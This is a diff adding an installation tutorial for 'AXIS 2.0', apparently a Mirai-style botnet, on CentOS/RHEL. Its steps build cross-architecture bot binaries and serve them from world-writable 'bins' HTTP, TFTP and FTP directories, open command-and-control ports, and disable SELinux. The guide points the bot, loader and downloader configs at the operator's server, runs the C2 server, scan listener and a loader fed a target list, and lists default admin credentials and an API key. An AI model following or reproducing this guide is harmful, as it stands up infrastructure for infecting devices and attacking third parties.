@@ -1,0 +1,262 @@
+================================================================================
+                    AXIS 2.0 INSTALLATION TUTORIAL
+                    CentOS 7/8/9 Stream & RHEL
+================================================================================
+
+This tutorial will guide you through setting up AXIS 2.0 on CentOS/RHEL.
+
+================================================================================
+STEP 1: SYSTEM UPDATE AND BASIC PACKAGES
+================================================================================
+
+sudo yum update -y
+sudo yum install -y screen wget curl git gcc gcc-c++ make
+
+# For CentOS 8/9 Stream, also install:
+sudo dnf install -y gcc gcc-c++ make
+
+================================================================================
+STEP 2: INSTALL GO
+================================================================================
+
+# Download Go
+cd /tmp
+wget https://go.dev/dl/go1.19.5.linux-amd64.tar.gz
+
+# Extract
+sudo tar -C /usr/local -xzf go1.19.5.linux-amd64.tar.gz
+
+# Add to PATH
+echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
+source ~/.bashrc
+
+# Verify
+go version
+
+================================================================================
+STEP 3: INSTALL MARIADB
+================================================================================
+
+# Create MariaDB repo file
+sudo tee /etc/yum.repos.d/MariaDB.repo << EOF
+[mariadb]
+name = MariaDB
+baseurl = http://yum.mariadb.org/10.6/centos7-amd64
+gpgkey=https://yum.mariadb.org/RPM-GPG-KEY-MariaDB
+gpgcheck=1
+EOF
+
+# Install MariaDB
+sudo yum install -y MariaDB-server MariaDB-client
+
+# Start and enable
+sudo systemctl start mariadb
+sudo systemctl enable mariadb
+
+# Secure
+sudo mysql_secure_installation
+
+# Create database
+sudo mysql -u root -p << EOF
+CREATE DATABASE AXIS2;
+CREATE USER 'axis'@'localhost' IDENTIFIED BY 'axis_password_123';
+GRANT ALL PRIVILEGES ON AXIS2.* TO 'axis'@'localhost';
+FLUSH PRIVILEGES;
+EXIT;
+EOF
+
+================================================================================
+STEP 4: INSTALL CROSS-COMPILERS
+================================================================================
+
+# Install EPEL repo
+sudo yum install -y epel-release
+
+# Install cross-compilers (may need to build from source for some archs)
+sudo yum install -y \
+    gcc-arm-linux-gnu \
+    gcc-aarch64-linux-gnu \
+    gcc-powerpc64-linux-gnu
+
+# For additional architectures, download from:
+# https://www.mentorsys.de/cross-compiler
+
+================================================================================
+STEP 5: INSTALL WEB SERVERS
+================================================================================
+
+# Install Apache
+sudo yum install -y httpd
+
+# Create directories
+sudo mkdir -p /var/www/html/bins
+sudo chmod 777 /var/www/html/bins
+
+# Install TFTP
+sudo yum install -y tftp-server
+sudo mkdir -p /var/lib/tftpboot
+sudo chmod 777 /var/lib/tftpboot
+
+# Configure TFTP
+sudo sed -i 's/disable = yes/disable = no/' /etc/xinetd.d/tftp
+sudo systemctl restart xinetd
+
+# Install VSFTPD
+sudo yum install -y vsftpd
+sudo mkdir -p /var/ftp
+sudo chmod 777 /var/ftp
+
+# Start services
+sudo systemctl start httpd
+sudo systemctl enable httpd
+sudo systemctl start vsftpd
+sudo systemctl enable vsftpd
+
+================================================================================
+STEP 6: FIREWALL CONFIGURATION
+================================================================================
+
+# Using firewalld
+sudo yum install -y firewalld
+sudo systemctl start firewalld
+sudo systemctl enable firewalld
+
+sudo firewall-cmd --permanent --add-port=3778/tcp
+sudo firewall-cmd --permanent --add-port=3779/tcp
+sudo firewall-cmd --permanent --add-port=9555/tcp
+sudo firewall-cmd --permanent --add-port=80/tcp
+sudo firewall-cmd --permanent --add-port=69/udp
+sudo firewall-cmd --permanent --add-port=21/tcp
+sudo firewall-cmd --reload
+
+# Or using iptables
+sudo yum install -y iptables-services
+sudo iptables -A INPUT -p tcp --dport 3778 -j ACCEPT
+sudo iptables -A INPUT -p tcp --dport 3779 -j ACCEPT
+sudo iptables -A INPUT -p tcp --dport 9555 -j ACCEPT
+sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+sudo iptables -A INPUT -p udp --dport 69 -j ACCEPT
+sudo service iptables save
+
+================================================================================
+STEP 7: INSTALL DEPENDENCIES
+================================================================================
+
+# Install MySQL development headers
+sudo yum install -y mysql-devel
+
+# Install Go dependencies
+cd /root/production\ source/cnc
+go mod init production-cnc
+go get github.com/go-sql-driver/mysql
+go get github.com/mattn/go-shellwords
+
+================================================================================
+STEP 8: BUILD AXIS 2.0
+================================================================================
+
+cd /root/production\ source
+chmod +x build.sh
+
+# Build (may need to disable some architectures)
+./build.sh
+
+# If build fails, try building without cross-compilers:
+# Edit build.sh and comment out cross-compile sections
+
+================================================================================
+STEP 9: IMPORT DATABASE
+================================================================================
+
+sudo mysql -u root -p < database.sql
+
+# Change admin password
+sudo mysql -u root -p AXIS2 -e "UPDATE users SET password='YOUR_NEW_PASSWORD' WHERE username='admin';"
+
+================================================================================
+STEP 10: CONFIGURE
+================================================================================
+
+nano cnc/main.go      # Database: axis:axis_password_123@tcp(127.0.0.1:3306)/AXIS2
+nano bot/config.h     # CNC_ADDR to your server IP
+nano loader/config.h  # HTTP_SERVER to your server IP
+nano dlr/dlr.h        # HTTP_SERVER to your server IP
+
+================================================================================
+STEP 11: RUN AXIS 2.0
+================================================================================
+
+# Screen sessions
+screen -S cnc
+./cnc_server
+# Ctrl+A, D to detach
+
+screen -S scan
+./scanListen
+# Ctrl+A, D to detach
+
+screen -S loader
+./loader < list.txt
+# Ctrl+A, D to detach
+
+# Reattach
+screen -r cnc
+screen -r scan
+screen -r loader
+
+================================================================================
+SELINUX CONFIGURATION (If enabled)
+================================================================================
+
+# Check status
+getenforce
+
+# Temporarily disable
+sudo setenforce 0
+
+# Or configure properly:
+sudo setsebool -P httpd_can_network_connect 1
+sudo chcon -R -t httpd_sys_content_t /var/www/html/bins
+
+================================================================================
+DEFAULT CREDENTIALS
+================================================================================
+
+Database: AXIS2 / axis / axis_password_123
+Admin: admin / dhcp146E
+API Key: AXIS2-ADMIN-7F3D9A2B-E8C1-4F6A
+
+================================================================================
+TROUBLESHOOTING
+================================================================================
+
+# Check services
+systemctl status mariadb
+systemctl status httpd
+systemctl status firewalld
+
+# Check ports
+netstat -tulpn | grep -E '3778|3779|9555|80'
+
+# Check logs
+tail -f /var/log/httpd/error_log
+tail -f /var/log/mariadb/mariadb.log
+
+# SELinux audit logs
+tail -f /var/log/audit/audit.log
+
+================================================================================
+CENTOS 8/9 SPECIFIC NOTES
+================================================================================
+
+# CentOS 8/9 uses dnf instead of yum
+dnf install -y [package]
+
+# CentOS Stream may need PowerTools repo
+sudo dnf config-manager --set-enabled powertools
+
+# Install GCC toolset if needed
+sudo dnf install -y gcc-toolset-9
+scl enable gcc-toolset-9 bash
+
+================================================================================
